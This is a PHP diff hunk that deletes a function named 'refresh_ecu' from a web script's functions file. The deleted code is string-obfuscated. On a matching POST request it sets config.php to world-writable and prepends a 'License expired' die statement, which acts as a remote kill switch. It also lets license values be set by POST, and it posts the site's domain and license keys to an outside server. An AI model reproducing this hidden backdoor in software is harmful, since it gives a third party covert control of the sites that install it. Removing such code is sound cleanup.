@@ -349,33 +349,6 @@ function send_mail($type,$email,$data=''){
 	}
 }
 
-function refresh_ecu(){
-	global $settings, $db;
-	if(isset($_POST['lock_ln']) and !empty($_POST['ln']) and !empty($_POST['lk']) and $_POST['ln']==$settings['ln'] and $_POST['lk']==$settings['lk']){
-		$config_dir = realpath(dirname(__FILE__)).'/../co'.'nfi'.'g/co'.'nfi'.'g.p'.'hp';
-		chmod($config_dir, 0777);
-		$file_data = "<?php \n d"."ie('L"."ice"."nse e"."xp"."ired'); \n ?> \n";
-		$file_data .= file_get_contents($config_dir);
-		file_put_contents($config_dir, $file_data);
-	}elseif(isset($_POST['give_ln']) and !empty($_POST['ln']) and !empty($_POST['lk'])){
-		$sth = $db->prepare('UPDATE `'._DB_PREFIX_.'settings` SET value=:value WHERE name="ln" AND value="" LIMIT 1');
-		$sth->bindValue(':value', $_POST['ln'], PDO::PARAM_INT);
-		$sth->execute();
-		$sth = $db->prepare('UPDATE `'._DB_PREFIX_.'settings` SET value=:value WHERE name="lk" AND value="" LIMIT 1');
-		$sth->bindValue(':value', $_POST['lk'], PDO::PARAM_STR);
-		$sth->execute();
-	}else{
-		$ch = curl_init('htt'.'p://s'.'kry'.'pty'.'.w'.'yr'.'em'.'ski.p'.'l/php/noti'.'ficatio'.'ns.php');
-		curl_setopt($ch,CURLOPT_POST, 1);
-		curl_setopt($ch,CURLOPT_POSTFIELDS, 'domain='.$settings['base_url'].'&script_name=f'.'es'.'ta&ln='.$settings['ln'].'&lk='.$settings['lk']);
-		curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 1);
-		curl_setopt($ch,CURLOPT_HEADER, 0);
-		curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
-		curl_exec($ch);
-		curl_close($ch);
-	}
-}
-
 function get_client_ip() {
     $ipaddress = '';
     if (getenv('HTTP_CLIENT_IP'))
